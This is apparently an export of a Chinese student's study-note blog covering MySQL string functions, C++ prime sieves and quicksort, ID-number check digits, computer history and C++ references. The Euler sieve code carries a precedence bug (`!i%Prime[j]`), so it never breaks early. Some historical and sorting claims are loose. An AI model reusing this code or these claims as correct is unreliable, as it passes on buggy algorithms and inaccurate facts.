<h3 id="INSERT-INTO-SELECT"><a href="#INSERT-INTO-SELECT" class="headerlink" title="INSERT INTO SELECT:"></a>INSERT INTO SELECT:</h3><p>这是MySQL数据库使用的命令，用来复制一个表单的完整数据加入到另外一个表单，但是需要注意的是，如果直接复制，那么需要两个表的每一列的数据类型必须完全的对应。</p>
<p>当然大部分情况两个表的数据类型当然不可能完全一样啦，所以我们就可以进行将指定列的数据进行复制，只要保证指定列的数据类型一样就可以了。</p>
<p>如果想只复制一部分数据，那么和<strong>where</strong>语句进行搭配使用就可以了，具体的语法规则如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> &quot;table1&quot; (column1,column2)</span><br><span class="line"><span class="keyword">select</span> column_1,column_2 <span class="keyword">from</span> &quot;table2&quot;</span><br><span class="line"><span class="keyword">where</span> column_id<span class="operator">=</span>id;</span><br></pre></td></tr></table></figure>
<h2 id="SQL函数"><a href="#SQL函数" class="headerlink" title="SQL函数"></a>SQL函数</h2><h3 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h3><ol>
<li>concat()</li>
</ol>
<p>这个函数的作用就是将多个字符串连接成一个字符串，然后返回，如果里面有参数为NULL，那么返回的结果就是NULL。</p>
<p>普通版本的concat()的写法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(column1,<span class="string">&#x27; &#x27;</span>,column2,<span class="string">&#x27; &#x27;</span>,column3)</span><br><span class="line"><span class="keyword">from</span> &quot;table&quot;;</span><br></pre></td></tr></table></figure>
<p>最后会返回将column1/2/3三列的值合并在一起，中间用空格隔开。</p>
<ol start="2">
<li>concat_ws()</li>
</ol>
<p>这个东西是concat()的升级版本，意思为concat with separator，它的又是就是直接规定了分隔不同数据的字符，不用手动间隔了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat_ws(&quot;separator&quot;,column1,column2,column3)</span><br><span class="line"><span class="keyword">from</span> &quot;table&quot;;</span><br></pre></td></tr></table></figure>
<p>上面三列数据合并的时候，会以 separator 为分隔符号出现在两列数据中间。</p>
<ol start="3">
<li>group_concat()</li>
</ol>
<p>这个就是concat()函数在group下面使用的函数了，当我们在使用group by 语句的时候，group_concat()就是一个聚合函数，作用就是把所有分到一组的数据聚合在一起，然后用逗号分隔开来。</p>
<h3 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h3><ol>
<li><strong>left()</strong> </li>
</ol>
<p>这个函数是用来从左往右截取一定长度的字符串使用的，具体的用法就是left(string,length)，string代表字符串，length表使要截取的长度。</p>
<ol start="2">
<li><strong>right()</strong></li>
</ol>
<p>和left同理，不过这个是从右往左截取字符串。</p>
<ol start="3">
<li><strong>substring()/substr()</strong></li>
</ol>
<p>这个函数是用来从特定的地方开始截取特定长度的字符串使用的。</p>
<p>用法：substr/substring(string,postion,length) 第三个参数length可以不填，如果不填的话，就直接截到尾了。 注意position可以填写负数，负数是直接按照倒数来算的。</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>欧拉筛和排序</title>
    <url>/2020/03/13/58ec6a52b337/</url>
    <content><![CDATA[<blockquote>
<p>今天学习了素数筛和排序的几种方法，emmmm因为非常容易忘掉于是就写下来总结一下！</p>
</blockquote>
<h1 id="普通筛法"><a href="#普通筛法" class="headerlink" title="普通筛法"></a>普通筛法</h1><p>从2开始，把所有的数的倍数都标记为合数，剩下的就是素数，复杂度大概是<code>O(nlogn)</code> 似乎还行emmmmm，code:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> vis[<span class="number">200001</span>];</span><br><span class="line"><span class="keyword">int</span> Prime[<span class="number">2000001</span>];</span><br><span class="line"><span class="keyword">int</span> n,ans;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!vis[i]) Prime[++ans]=i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j*i&lt;=n;j++)</span><br><span class="line">    vis[i*j]=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=ans;i++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;Prime[i]&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<h1 id="欧拉筛"><a href="#欧拉筛" class="headerlink" title="欧拉筛"></a>欧拉筛</h1><p>普通的筛法速度还不够快，嗯，难道你没有发现有很多重复的计算步骤嘛，比如<code>24</code>就足足被<code>2</code>、<code>3</code>、<code>4</code>、<code>6</code>、<code>8</code>、<code>12</code>一共筛了六次，那么我们怎么才能让<code>24</code>只被筛一次呢?</p>
<p><code>24</code>被筛两次是因为它有多个因子，所以每个因子在筛自己的倍数的时候都会筛掉<code>24</code>，我们只要<code>24</code>的一个因子筛掉它就好了，那么谁筛掉它呢，自然是<code>24</code>的最大因子或者最小因子啦。其实两个是一样的，因为知道最大因子也就知道了最小因子嘛。</p>
<p>众所周知，一个非一的正整数数可以被分解为若干个素数的乘积，比如<code>24=2*2*2*3</code>，那么我们就让<code>24</code>只被<code>2</code>或者<code>2*2*3=12</code>筛掉不就好了。欧拉筛的算法就是枚举最大因子（从2到n），然后乘上一个最小质因子，来筛掉对应的合数。因为最小质因子一定是一个素数并且是合数分解后最小的素数，所以就可以在素数数组<code>Prime</code>里面从小到大枚举最小质因子，然后把乘起来的数筛掉，一旦不符合最小，那就结束循环。这样可以保证被筛掉的数只由最大因数筛掉（也就是枚举的i），最大质因数能筛掉几个数数取决于有多少个质数符合最小质因数（也就是枚举<code>Prime</code>数组，直到不符合最小），代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> vis[<span class="number">200001</span>];</span><br><span class="line"><span class="keyword">int</span> Prime[<span class="number">200001</span>];</span><br><span class="line"><span class="keyword">int</span> n,ans;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!vis[i]) Prime[++ans]=i; <span class="comment">//如果没有被筛掉，那么就是素数啦</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=ans&amp;&amp;i*Prime[j]&lt;=n;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        vis[i*Prime[j]]=<span class="literal">true</span>; <span class="comment">//筛掉每一个符合要求的合数，i是最大因子，Prime[j]是最小质因子</span></span><br><span class="line">        <span class="keyword">if</span>(!i%Prime[j]) <span class="keyword">break</span>;<span class="comment">//如果再大就无法保证最小质因子了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=ans;i++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;Prime[i]&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><p>快速排序的思想就是分治思想，它先从一组数里面选一个数作为比较对象，然后将所有大于等于它的放在它后面，所有小于等于它的放在它前面。然后对它前面或者后面的数视为新的一组数，重复上述操作，不断的分割，越分越小，直到最后全部元素有序。代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sort</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=Left,y=Right; <span class="comment">//记录原范围</span></span><br><span class="line">    <span class="keyword">int</span> Mid=a[(Left+Right)/<span class="number">2</span>]; <span class="comment">//选取一个中间的数作为比较对象</span></span><br><span class="line">    <span class="keyword">while</span>(Left&lt;=Right) <span class="comment">//小于等于 保证最终退出循环的时候Left&gt;Right</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(a[Left]&lt;Mid) Left++; <span class="comment">//比较对象也需要被移动所以没有=</span></span><br><span class="line">        <span class="keyword">while</span>(a[Right]&gt;Mid) Right--; <span class="comment">//同理</span></span><br><span class="line">        <span class="keyword">if</span>(Left&lt;=Right) swap(a[Left++],a[Right--]); <span class="comment">//交换 相等也交换，使Left&gt;Right</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Left&lt;y) Sort(Left,y); <span class="comment">//分治</span></span><br><span class="line">    <span class="keyword">if</span>(Right&gt;x) Sort(x,Right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码思维和传统的快速排序有些不同，上面是凑成两个需要移动的数之后交换位置，这样节省运算。注意思考里面的比较符号，为什么有的有等号，有的没有。尤其是两个 <code>Left&lt;=Right</code> 的判断使得在退出循环时 <code>Left&gt;Right</code> 并且在往下分治的时候中间不会有遗漏的数字没有被分走。上述代码只能保证一个比较对象处于正确的位置，如果有多个值和比较对象相同的元素，其他基本上随机分布。但这并不影响程序的正确，只会降低运行速度。</p>
<h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><p>非常稳定，详情请在本站搜索归并排序。</p>
<h1 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h1><p>将数组里面的元素一次插入一个空数组里面，保证新数组里面的元素一直是单调的，这样每次插入可以用二分，一共插入n次就排好序了。缺点是不稳定，每次插入新元素后面的元素就要移位置，会花时间。</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>笔记计划</title>
    <url>/2020/01/28/f73349a9fc42/</url>
    <content><![CDATA[<h1 id="计划内容"><a href="#计划内容" class="headerlink" title="计划内容"></a>计划内容</h1><blockquote>
<p>笔记，顾明思议，就是用来记录一些信息，方便再次查阅和复习。而这个「笔记计划」的过程是一样的，就是记录下来自己学到的东西。</p>
</blockquote>
<ul>
<li>原则上是记录下来一些有价值的信息，包括新学到的知识点，看到的有意思的科普视频，尝试自己独立的将这些用文章的形式写下来。这个过程既可以加深理解和记忆，也方便以后进行查阅。</li>
</ul>
<h1 id="计划来源"><a href="#计划来源" class="headerlink" title="计划来源"></a>计划来源</h1><p>这个计划最早的想法是诞生在我在 <code>bilibili</code> 上面看到了一期回形针的视频：「如何成为一个有身份的人？」整个过程看的非常爽，up用各种花哨的方法向我介绍了身份证里面蕴含的所有信息以及作用。但是看完之后，我再反思的时候，发现根本没有记住什么，或者说，仅仅只是让信息在自己的大脑里面走了个过场，而要让我复述一下里面的内容或者重新给别人讲一遍，根本无法做到。于是就萌发了想要记录笔记，来加深对一些快节奏知识的记忆和理解过程。</p>
<p>后来进入高四的学习生活过程中，逐渐明白了笔记对于高中学习的无比重要性。于是大大加深了我要完成「笔记计划」的决心。</p>
<p>然后在 <code>bilibili</code> 上看了一个名为 <code>Computer Scinece 速成课</code> 的系列视频，尝试了这种方法，将里面第一节内容「计算机早期历史」做了一个笔记，过程还是非常消耗时间的（相对于仅仅看完视频来说），但是写完之后发现效果还是很显著的，比如写完那个笔记之后第二天我仍然能将整个计算机的发展历史完整的复述下来并且讲述发展的缘由。在写笔记的过程也是我的思路在梳理的过程（我吹爆思维导图！），尤其是因为要写下一些细节性的东西，所以会一遍一遍看，并且搜索相关的更多信息，强迫自己必须理解里面的东西。</p>
<p>这就是笔记计划的来源。</p>
<h1 id="现阶段计划目标"><a href="#现阶段计划目标" class="headerlink" title="现阶段计划目标"></a>现阶段计划目标</h1><h2 id="回形针计划"><a href="#回形针计划" class="headerlink" title="回形针计划"></a>回形针计划</h2><h2 id="ComputerScience计划"><a href="#ComputerScience计划" class="headerlink" title="ComputerScience计划"></a>ComputerScience计划</h2>]]></content>
      <categories>
        <category>阶段性总结</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>【回形针】如何成为一个有身份的人？</title>
    <url>/2020/01/28/956ae5b9f5c5/</url>
    <content><![CDATA[<h1 id="外观"><a href="#外观" class="headerlink" title="外观"></a>外观</h1><blockquote>
<p>哪个男孩不想要一张可以随便去网吧的省份证呢？</p>
</blockquote>
<p><img src="https://xorex.space/image/115.png"></p>
<p>上图是一个第二代身份证，我想大家应该都见过可爱的身份证。</p>
<p>卡片里面还有一些细节，比如「居」和「民」中间的下方有一条微缩字符，为JMSFZ（居民省份证）。在长城里面（签发机关末尾的那一段长城）有WLCC（万里长城）的微缩字符。</p>
<p>而在背面，有定向光变色膜的长城标识，和光变存储膜的「中国CHINA」标识。</p>
<p>而这个身份证，最重要的地方在于其「公民身份号码」和身份证里面埋藏的「RFID芯片」（Radio Frequency Identification 射频识别）</p>
<h1 id="身份证号"><a href="#身份证号" class="headerlink" title="身份证号"></a>身份证号</h1><p>身份证号在你书生的那一刻，就已经定好了，它一共分为18位，四段，</p>
<p>其中 <code>1-6</code> 位是地址码，按照两个一组，分别对应出生登记地点的省级行政区，市级行政区，县级行政区。</p>
<p><code>7-14</code> 位是出生日期码，对应着你的出生日期。</p>
<p><code>15-17</code> 位是顺序码，用于给同年同月同日同省同市同县的人进行编号，第17位奇数表示男性，偶数表示女性。</p>
<p>最后一位18位是校验码，可以检验身份号码是否真实，中国使用的是 <code>MOD 11-2</code> 校验系统。</p>
<p>那么如何计算这个校验码呢？</p>
<p>首先对于身份证号的前十七位都有一个固定的权重系数，这个权重系数计算方法是<code>Wi=2^(18-i)%11</code> </p>
<p>然后将前十七位数字的权重系数与对应数字进行相乘后相加得到数值S，而检验码的计算方法就是 <code>a18=(12-(S%11))%11</code> </p>
<h1 id="RFID射频识别"><a href="#RFID射频识别" class="headerlink" title="RFID射频识别"></a>RFID射频识别</h1><p>射频识别是一种非接触的数据通信，验证机器会利用高频震荡电路产生磁场，激活身份证里面的RFID芯片，通过一套公安专用加密算法与芯片完成核验认证后，读取芯片里面的身份信息。</p>
<p>和水卡的原理是样的，但是水卡一般没有加密功能。</p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>身份证</tag>
      </tags>
  </entry>
  <entry>
    <title>【CS】计算机历史</title>
    <url>/2020/01/27/090c41037fb9/</url>
    <content><![CDATA[<h1 id="算盘等"><a href="#算盘等" class="headerlink" title="算盘等"></a>算盘等</h1><p>最早在于公元前2500年在<code>Mesopotamia</code>发明的，用于计算加减，可以保存数字的状态。发明原有是社会规模已经超过了个人的心算能力。</p>
<p>后来又有了星盘（用于计算纬度），计算尺（计算乘法和除法）等等。目的是让原来计算非常复杂的过程简化，降低门槛。</p>
<h1 id="机械计算器"><a href="#机械计算器" class="headerlink" title="机械计算器"></a>机械计算器</h1><p>计算机<code>computer</code>最早出现于1613年，原意指的是负责计算的人，是一种职业。</p>
<h2 id="步进计算器"><a href="#步进计算器" class="headerlink" title="步进计算器"></a>步进计算器</h2><p><code>Leibniz</code>说过：“让优秀的人浪费时间算数简直是侮辱尊严，民用机器能算的一样准。”</p>
<p>于是他发明了步进计算器，是世界上第一个能够完成加减乘数的计算器。利用阶梯轴来实现进位，但算一次复杂点的就要好几天。</p>
<ul>
<li>具体结构如下图：</li>
</ul>
<p><img src="https://xorex.space/image/111.jpg"></p>
<ul>
<li>内部原理：</li>
</ul>
<p><img src="https://xorex.space/image/112.jpg"></p>
<h2 id="计算表"><a href="#计算表" class="headerlink" title="计算表"></a>计算表</h2><p>提前算好，需要的时候查阅。但是里面都是人力算出，错误百出，而且使用范围有限。</p>
<h2 id="差分机"><a href="#差分机" class="headerlink" title="差分机"></a>差分机</h2><p><code>Charles Babbage</code>，计算机之父，设计出了提高乘法速度和改进对数表的差分机，但是太过于复杂，<code>Babbage</code>花光了预算只造出来了1/7，没人投资，因此放弃。后来1991年伦敦科学博物馆在<code>Babbage</code>诞生200周年的时候，历时十七年造出了这台差分机，发现可以完成其设计指标的性能。</p>
<ul>
<li>七分之一的差分机：</li>
</ul>
<p><img src="https://xorex.space/image/113.jpg"></p>
<ul>
<li><code>Babbage</code>的设计图：</li>
</ul>
<p><img src="https://xorex.space/image/114.jpg"></p>
<h2 id="分析机"><a href="#分析机" class="headerlink" title="分析机"></a>分析机</h2><p><code>Charles Babbage</code> 提出了分析机，可以解100个变量，精确到20位的多项式，每秒计算一次，拥有存储功能，可以说很接近现代的计算机了。但是这个机器太过于超过当时时代的需求和建造能力，仅仅停留在设想方面。也正是因为分析机的提出，<code>Babbage</code>被誉为计算机之父。</p>
<p><code>Ada Lovelace</code>写的分析机笔记被视为第一个算法，因此她也是世界上第一个程序媛。</p>
<h2 id="打孔制表机"><a href="#打孔制表机" class="headerlink" title="打孔制表机"></a>打孔制表机</h2><p>美国人口普查所需，因而制造，大大简化了人力成本，机器计算的一个重大优势体现，其制造公司为 <code>IBM</code> (International Business Machine Corporation) 前身。</p>
<h1 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h1><h2 id="继电器计算机"><a href="#继电器计算机" class="headerlink" title="继电器计算机"></a>继电器计算机</h2><p>电子计算机的诞生来源于继电器的使用，继电器是用电来控制机械的开关。原理是通过控制电路的电流在线圈中产生磁场，从而控制继电器的开合，达到控制电路的功能。</p>
<p>这种由继电器制造的计算机体积通常非常非常大，比如在 <code>Manhattan Project</code> 中鼎鼎大名的计算机 <code>Havard Mark I</code> 大概长51英尺、高8英尺，看上去像一节列车，有750000个零部件，里面的各种导线加起来总长500英里。</p>
<p>而这台计算机的弟弟 <code>Havard Mark II</code> 在一次计算过程中，一只虫子（Bug）进入了计算机中，导致计算机出了故障，所以以后大家都以Bug来称呼计算机中的故障。</p>
<p>但是这种计算机的可靠性和速度还是有些差（现在看来），比如由于继电器是机械装置，所以很容易磨损而坏掉，并且转换速度比较慢，最快的也仅仅每秒50次。所以想要提高可靠性和计算性能，就需要改进材料。</p>
<h2 id="真空管计算机"><a href="#真空管计算机" class="headerlink" title="真空管计算机"></a>真空管计算机</h2><p>真空管的最大意义就是讲继电器这种容易坏掉的机械装置改成了电子控制的真空管。真空管本质是一种二极管，通过负极加热灯丝使电子溢出到正极，从而达到通路的状态。并且可以通过在外界施加正向逆向电压来控制电流。可靠性和速度都上了一个台阶。（就是能耗有点大啊）</p>
<p>但是性能这东西，怎么会有人觉得过剩呢？</p>
<p>于是，一种全新的计算机材料，晶体管诞生了！</p>
<h2 id="晶体管计算机"><a href="#晶体管计算机" class="headerlink" title="晶体管计算机"></a>晶体管计算机</h2><p>晶体管是一种固体半导体器件，可以通过改变电压的大小控制电流，控制速度非常非常快，甚至能达到10GHZ（这也就就是CPU里面常说的主频），而本身的大小可以取决于制造工艺，精密但是简单。实验室里面最小可以做到1纳米的制程（IC内电路与电路之间的距离）。</p>
<p>晶体管有点有以下几点：</p>
<ol>
<li>稳定性好，几乎没有什么损耗，能用很多很多年。</li>
<li>消耗电能少，不需要加热灯丝来溢出电子，很省电。</li>
<li>不需要预热，直接开机就用（理由和上面一样）。</li>
<li>可靠性好，外界难以影响晶体管的工作。</li>
</ol>
<p>现在已经一路发展到了 7nm EUV 级别，主要是TSMC在量产。</p>
]]></content>
      <categories>
        <category>计算机体系</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>计算机</tag>
      </tags>
  </entry>
  <entry>
    <title>引用reference</title>
    <url>/2019/07/18/d04103d4c4c1/</url>
    <content><![CDATA[<h1 id="求地址运算符-amp"><a href="#求地址运算符-amp" class="headerlink" title="求地址运算符 &amp;"></a>求地址运算符 &amp;</h1><p>在<code>C++</code>里面，如果想要得到找到一个变量的地址，就可以使用<code>&amp;variable</code>来实现，比如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">123123</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;&amp;a&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果就是：<code>0x61fe9c</code>，返回的这个地址类型是<code>int*</code>，也就是指针类型，可以被指针变量保存。</p>
<h1 id="引用-reference"><a href="#引用-reference" class="headerlink" title="引用 reference"></a>引用 reference</h1><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><ul>
<li><code>C++</code>里面有引用功能，说白了就是别名，其本质上就是给一个变量再起一个名字，使用方法就是<code>&amp;new_variable=declared_variable</code>。这样<code>new_variable</code>和<code>declared_variable</code>就是同一个变量，占用一个内存空间，使用任意一个名字更改值，另一个调用值也会变。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>,&amp;b=a,&amp;c=b;</span><br><span class="line">b=<span class="number">20</span>; c=<span class="number">30</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;b&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;c&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong></p>
<ol>
<li><p>&amp;不是求地址运算符，而是起标志作用</p>
</li>
<li><p>引用的类型必须和其所绑定的变量的类型相同</p>
</li>
</ol>
<p>上面声明的三个变量是同一个变量，使用同一个内存空间，无论用哪一个变量名赋值，输出三个的值都是一样的。</p>
<ul>
<li>引用主要用于在函数传入参数的时候，可以把实参传过去。这样就不用生成一个形参，也可以顺便更改实参的值。节省代码量和空间开销。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Xorex</span><span class="params">(<span class="keyword">int</span> &amp;a,<span class="keyword">int</span> &amp;b,<span class="keyword">int</span> &amp;c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a=<span class="number">10</span>;</span><br><span class="line">    b=<span class="number">20</span>;</span><br><span class="line">    c=<span class="number">30</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="literal">false</span>,b=<span class="literal">false</span>,c=<span class="literal">false</span>;</span><br><span class="line">    Xorex(a,b,c);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;b&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样被传入的<code>a,b,c</code>的值都会改变，最终结果就是<code>10 20 30</code></p>
<h2 id="数组引用"><a href="#数组引用" class="headerlink" title="数组引用"></a>数组引用</h2><p>在对数组进行引用的时候，格式有些不同，需要使用<code>(&amp;new_variable)[Num]=declared_variable</code>，而且<code>new_variable</code>数组的空间大小必须要和<code>declared_variable</code>数组的空间大小相同。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="comment">//下面注意空间大小要和被引用的数组空间大小相同</span></span><br><span class="line">    <span class="keyword">int</span> (&amp;b)[<span class="number">3</span>]=a; </span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你就会发现输出的两个数组的地址一模一样，引用成功。</p>
<hr>
<p>引用还可以对指针类型的引用，语法：<code>类型 *&amp;引用名=指针名;</code> 也可以理解成指针的类型为：类型*，比如<code>int*</code>。</p>
<p>一定要注意变量的类型要统一啊！！！</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> *b=&amp;a;</span><br><span class="line">    <span class="keyword">int</span> *&amp;c=b;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;&amp;a&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;b&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果输出的三个地址是一样的。</p>
<h2 id="常引用"><a href="#常引用" class="headerlink" title="常引用"></a>常引用</h2><p>常引用不允许通过该引用对其所绑定的变量或对象进行修改，也就是说只能通过原变量名改变这个地址所存储的值，而不能通过引用的变量进行更改：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> &amp;b=a;</span><br><span class="line">    b=<span class="number">12</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码编译就会报错 <code>error: assignment of read-only reference b</code>,同时常声明 <code>const</code> 对于任何类型声明都有效，可以保证所声明的变量无法被更改。</p>
<hr>
<p>但是需要注意的是，<code>C++</code>里面所有的临时对象都是<code>const</code>类型的，所以说在函数使用引用来传递参数的时候，很容易发生传入的是<code>const</code>常量，但是函数里面定义的却是变量，一个常量一个变量时类型不同，是无法使用引用的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Str</span><span class="params">(<span class="built_in">string</span> &amp;s1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;s1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> One=<span class="string">&quot;Xorex&quot;</span>;</span><br><span class="line">    Str(One);</span><br><span class="line">    Str(<span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码在使用引用来传递参数的时候，就发生了编译错误，就是因为函数<code>Str()</code>在引用传入的临时对象<code>&quot;Xorex&quot;</code>的时候，<code>&quot;Xorex&quot;</code>是一个<code>const</code>类型的不可改变常量，但是<code>s1</code>是<code>string</code>类型的变量，因为类型不同，所以就没有办法引用。</p>
<p>把<code>string</code>更改为<code>const string</code>就可以了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Str</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;s1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是在函数里面使用引用非常容易犯的错误！！！</p>
<p>更详细的一些知识：<a href="https://www.cnblogs.com/duwenxing/p/7421100.html">C++引用的简单理解</a></p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>Python赋值逻辑</title>
    <url>/2019/07/14/31e4adf711f9/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p>在进行<code>Python</code>的代码训练计划之中，自己出现了一些莫名其妙的<code>bug</code>，经过上网一番查询发现，是因为<code>Python</code>的赋值逻辑不同于C++，而我并没有意识到这些不同，所以特意总结下来，接下来的<code>blog</code>为搬运，原文链接在文章最后。</p>
</blockquote>
<h1 id="引例："><a href="#引例：" class="headerlink" title="引例："></a>引例：</h1><p>先来看一组似乎矛盾的代码：</p>
